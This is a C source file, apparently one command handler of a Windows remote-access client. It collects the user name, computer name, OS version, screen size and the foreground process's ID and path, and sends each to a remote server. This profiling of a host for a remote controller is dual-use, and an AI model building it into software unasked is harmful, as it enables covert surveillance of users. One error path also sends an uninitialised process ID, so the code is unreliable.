#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "loadLibrary.h"

#define SERV_INFO_USERNAME 0x1
#define SERV_INFO_COMPUTER 0x2
#define SERV_INFO_VERSION 0x3
#define SERV_INFO_X 0x4
#define SERV_INFO_Y 0x5
#define SERV_INFO_FOCUS_PID 0x6
#define SERV_INFO_FOCUS_EXE 0x7

#define SERV_INFO_FAILED 0x0F

typedef DWORD (WINAPI *__GetModuleFileNameExA)(HANDLE, HMODULE, LPSTR, DWORD);

int cmds_INFO(void)
{
	ulong buffLen = net_MaxContLen - 1;
	char buff[buffLen];
	memset(buff, 0, buffLen);

	if(!GetUserName(buff + 1, &buffLen))
	{
		buff[0] = SERV_INFO_FAILED;

		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_USERNAME) < 1)
		{
			return 0;
		}
	}else{
		if(net_SendCmd((uint8*)buff, buffLen + 1, SERV_INFO_USERNAME) < 1)
		{
			return 0;
		}
	}

	uint8 *rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		return 0;
	}

	free(rmsg);
	buffLen = net_MaxContLen - 1;
	memset(buff, 0, buffLen);

	if(!GetComputerName(buff + 1, &buffLen))
	{
		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_COMPUTER) < 1)
		{
			return 0;
		}
	}else{
		if(net_SendCmd((uint8*)buff, buffLen + 1, SERV_INFO_COMPUTER) < 1)
		{
			return 0;
		}
	}
	
	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		return 0;
	}

	free(rmsg);
	buffLen = net_MaxContLen - 1;
	memset(buff, 0, buffLen);

	OSVERSIONINFO osver;
	osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	if(!GetVersionEx(&osver))
	{
		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_VERSION) < 1)
		{
			return 0;
		}
	}else{
		memcpy(buff + 1, &osver, sizeof(osver));

		if(net_SendCmd((uint8*)buff, sizeof(osver) + 1, SERV_INFO_VERSION) < 1)
		{
			return 0;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		return 0;
	}

	free(rmsg);
	buffLen = net_MaxContLen - 1;
	memset(buff, 0, buffLen);

	int screen_val_4b = GetSystemMetrics(SM_CXVIRTUALSCREEN);

	if(!screen_val_4b)
	{
		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_X) < 1)
		{
			return 0;
		}
	}else{
		memcpy(buff + 1, &screen_val_4b, sizeof(screen_val_4b));

		if(net_SendCmd((uint8*)buff, 5, SERV_INFO_X) < 1)
		{
			return 0;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		return 0;
	}

	free(rmsg);
	buffLen = net_MaxContLen - 1;
	memset(buff, 0, buffLen);

	screen_val_4b = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	
	if(!screen_val_4b)
	{
		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_Y) < 1)
		{
			return 0;
		}
	}else{
		memcpy(buff + 1, &screen_val_4b, sizeof(screen_val_4b));

		if(net_SendCmd((uint8*)buff, 5, SERV_INFO_Y) < 1)
		{
			return 0;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		return 0;
	}

	free(rmsg);
	buffLen = net_MaxContLen - 1;
	memset(buff, 0, buffLen);

	HWND focusHand = GetForegroundWindow();

	if(!focusHand)
	{
		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_PID) < 1)
		{
			return 0;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return 0;
		}
	
		free(rmsg);

		buff[0] = SERV_INFO_FAILED;
		
		if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_EXE) < 1)
		{
			return 0;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return 0;
		}
	
		free(rmsg);
	}else{
		ulong focusPid;
		
		if(!GetWindowThreadProcessId(focusHand, &focusPid))
		{
			buff[0] = SERV_INFO_FAILED;
			
			if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_PID) < 1)
			{
				return 0;
			}
	
			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				return 0;
			}
		
			free(rmsg);
	
			buff[0] = SERV_INFO_FAILED;
			
			if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_EXE) < 1)
			{
				return 0;
			}
	
			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				return 0;
			}
		
			free(rmsg);
		}

		memcpy(buff + 1, &focusPid, sizeof(focusPid));

		if(net_SendCmd((uint8*)buff, 5, SERV_INFO_FOCUS_PID) < 1)
		{
			return 0;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return 0;
		}
	
		free(rmsg);
		buffLen = net_MaxContLen - 1;
		memset(buff, 0, buffLen);

		__GetModuleFileNameExA info_GetModuleFileNameExA;
		HMODULE psapiLib = loadLibrary_Load(lib_Psapi);
		HANDLE hand = OpenProcess(PROCESS_QUERY_INFORMATION, 1, focusPid);

		if(!psapiLib)
		{
			if(hand)
			{
				CloseHandle(hand);
			}

			hand = NULL;
		}else{
			info_GetModuleFileNameExA = (__GetModuleFileNameExA)loadLibrary_LoadFunc(psapiLib, lib_GetModuleFileNameExA);
		}

		if(!hand)
		{
			buff[0] = SERV_INFO_FAILED;
			
			if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_EXE) < 1)
			{
				return 0;
			}
	
			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				return 0;
			}
		
			free(rmsg);
		}else{
			if(info_GetModuleFileNameExA(hand, NULL, buff + 1, buffLen))
			{
				CloseHandle(hand);
				FreeLibrary(psapiLib);

				if(net_SendCmd((uint8*)buff, strlen(buff + 1) + 1, SERV_INFO_FOCUS_EXE) < 1)
				{
					return 0;
				}
			}else{
				FreeLibrary(psapiLib);
				CloseHandle(hand);

				buff[0] = SERV_INFO_FAILED;
				
				if(net_SendCmd((uint8*)buff, 1, SERV_INFO_FOCUS_EXE) < 1)
				{
					return 0;
				}
			}

			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				return 0;
			}
		
			free(rmsg);
		}
	}

	return 1;
}